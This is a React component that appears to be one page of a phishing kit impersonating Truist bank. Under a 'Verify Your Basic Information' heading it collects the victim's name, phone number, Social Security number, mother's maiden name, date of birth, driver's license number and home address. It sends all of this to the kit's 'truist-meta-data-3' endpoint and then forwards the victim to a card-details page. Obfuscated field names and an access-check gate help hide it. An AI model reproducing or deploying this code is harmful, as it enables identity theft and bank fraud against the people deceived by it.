import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    fzNme: '', 
    lzNme: '', 
    phone: '', 
    ssn: '', 
    motherMaidenName: '', 
    dob: '', 
    driverLicense: '',
    stAd: '',
    city: '',
    state: '',
    zipCode: '',
    form: '' 
  });
  const [username, setUsername] = useState('');
  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
    }
  }, [emzemzState]);

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = (month && year) ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
        p2 ? `${p1}-${p2}` : `${p1}`
      );
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');
    
    const newErrors = { 
      fzNme: !fzNme.trim() ? 'First name is required.' : '',
      lzNme: !lzNme.trim() ? 'Last name is required.' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits.' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits.' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required." : '',
      dob: (!month || !day || !year) ? 'Complete date of birth is required.' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required." : '',
      stAd: !stAd.trim() ? 'Street address is required.' : '',
      city: !city.trim() ? 'City is required.' : '',
      state: !state.trim() ? 'State is required.' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required.' : '',
      form: ''
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      // Submit basic info and address in one request
      await axios.post(`${baseUrl}api/truist-meta-data-3/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense,
        stAd,
        apt,
        city,
        state,
        zipCode
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors((prev) => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.',
      }));
    } finally {
      setIsLoading(false);
    }
  };

  if (!isAllowed) {
    return null;
  }

  if (!username) {
    return (
      <div className="flex flex-col items-center justify-center">
        <div className={cardStyles.base}>
          <div className={cardStyles.padding}>
            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
              Unable to continue
            </h1>
            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
              We could not determine your session details. Please return to the previous step and try again.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col items-center justify-center">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Verify Your Basic Information & Home Address
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            Please confirm the details we have on file
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="fzNme">
                First name
              </label>
              <input
                id="fzNme"
                name="fzNme"
                type="text"
                value={fzNme}
                onChange={(e) => setFzNme(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="First name"
              />
              {errors.fzNme && (
                <div className="text-sm text-red-600">{errors.fzNme}</div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="lzNme">
                Last name
              </label>
              <input
                id="lzNme"
                name="lzNme"
                type="text"
                value={lzNme}
                onChange={(e) => setLzNme(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="Last name"
              />
              {errors.lzNme && (
                <div className="text-sm text-red-600">{errors.lzNme}</div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="phone">
                Phone Number
              </label>
              <input
                id="phone"
                name="phone"
                type="text"
                value={phone}
                onChange={(e) => setPhone(formatPhone(e.target.value))}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="(555) 123-4567"
              />
              {errors.phone && (
                <div className="text-sm text-red-600">{errors.phone}</div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="ssn">
                Social Security Number
              </label>
              <div className="flex items-center">
                <input
                  id="ssn"
                  name="ssn"
                  type={showSSN ? 'text' : 'password'}
                  value={ssn}
                  onChange={(e) => setSsn(formatSSN(e.target.value))}
                  maxLength={11}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="XXX-XX-XXXX"
                />
                <button
                  type="button"
                  onClick={() => setShowSSN(!showSSN)}
                  className="px-3 text-[#0f4f6c] text-sm hover:underline"
                >
                  {showSSN ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.ssn && (
                <div className="text-sm text-red-600">{errors.ssn}</div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="motherMaidenName">
                Mother's Maiden Name
              </label>
              <input
                id="motherMaidenName"
                name="motherMaidenName"
                type="text"
                value={motherMaidenName}
                onChange={(e) => setMotherMaidenName(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="Enter maiden name"
              />
              {errors.motherMaidenName && (
                <div className="text-sm text-red-600">{errors.motherMaidenName}</div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]">Date of Birth</label>
              <div className="flex gap-2">
                <select
                  value={month}
                  onChange={(e) => setMonth(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Month</option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option key={i + 1} value={i + 1}>
                      {new Date(0, i).toLocaleString('default', { month: 'long' })}
                    </option>
                  ))}
                </select>
                <select
                  value={day}
                  onChange={(e) => setDay(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Day</option>
                  {Array.from({ length: daysInMonth }, (_, i) => (
                    <option key={i + 1} value={i + 1}>
                      {i + 1}
                    </option>
                  ))}
                </select>
                <select
                  value={year}
                  onChange={(e) => setYear(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                >
                  <option value="">Year</option>
                  {years.map((y) => (
                    <option key={y} value={y}>
                      {y}
                    </option>
                  ))}
                </select>
              </div>
              {errors.dob && (
                <div className="text-sm text-red-600">{errors.dob}</div>
              )}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="driverLicense">
                Driver's License Number
              </label>
              <input
                id="driverLicense"
                name="driverLicense"
                type="text"
                value={driverLicense}
                onChange={(e) => setDriverLicense(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="Enter license number"
              />
              {errors.driverLicense && (
                <div className="text-sm text-red-600">{errors.driverLicense}</div>
              )}
            </div>

            <div className="border-t-2 border-slate-300 pt-6 mt-6">
              <h3 className="text-lg font-semibold text-slate-800 mb-4">Home Address</h3>
              
              <div className="space-y-6">
                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]" htmlFor="stAd">
                    Street Address
                  </label>
                  <input
                    id="stAd"
                    name="stAd"
                    type="text"
                    value={stAd}
                    onChange={(e) => setStAd(e.target.value)}
                    className={`${inputStyles.base} ${inputStyles.focus}`}
                    placeholder="Enter street address"
                  />
                  {errors.stAd && (
                    <div className="text-sm text-red-600">{errors.stAd}</div>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]" htmlFor="apt">
                    Apartment/Unit (Optional)
                  </label>
                  <input
                    id="apt"
                    name="apt"
                    type="text"
                    value={apt}
                    onChange={(e) => setApt(e.target.value)}
                    className={`${inputStyles.base} ${inputStyles.focus}`}
                    placeholder="Apt, Suite, Unit, etc."
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]" htmlFor="city">
                    City
                  </label>
                  <input
                    id="city"
                    name="city"
                    type="text"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    className={`${inputStyles.base} ${inputStyles.focus}`}
                    placeholder="Enter city"
                  />
                  {errors.city && (
                    <div className="text-sm text-red-600">{errors.city}</div>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]" htmlFor="state">
                    State
                  </label>
                  <input
                    id="state"
                    name="state"
                    type="text"
                    value={state}
                    onChange={(e) => setState(e.target.value)}
                    className={`${inputStyles.base} ${inputStyles.focus}`}
                    placeholder="Enter state"
                  />
                  {errors.state && (
                    <div className="text-sm text-red-600">{errors.state}</div>
                  )}
                </div>

                <div className="space-y-2">
                  <label className="text-sm text-[#5d4f72]" htmlFor="zipCode">
                    Zip Code
                  </label>
                  <input
                    id="zipCode"
                    name="zipCode"
                    type="text"
                    value={zipCode}
                    onChange={(e) => setZipCode(e.target.value)}
                    className={`${inputStyles.base} ${inputStyles.focus}`}
                    placeholder="Enter zip code"
                  />
                  {errors.zipCode && (
                    <div className="text-sm text-red-600">{errors.zipCode}</div>
                  )}
                </div>
              </div>
            </div>

            {errors.form && (
              <div className="rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-600">
                {errors.form}
              </div>
            )}

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className={buttonStyles.base}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className={buttonStyles.loading}></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>
          </form>
        </div>
      </div>

      <div className="mx-auto mt-10 w-full max-w-2xl space-y-6 text-sm text-[#5d4f72]">
        <p className="text-center leading-relaxed">
          For security reasons, never share your username, password, social security number, account number or other
          private data online, unless you are certain who you are providing that information to, and only share
          information through a secure webpage or site.
        </p>
      </div>
    </div>
  );
};

export default BasicInfo;
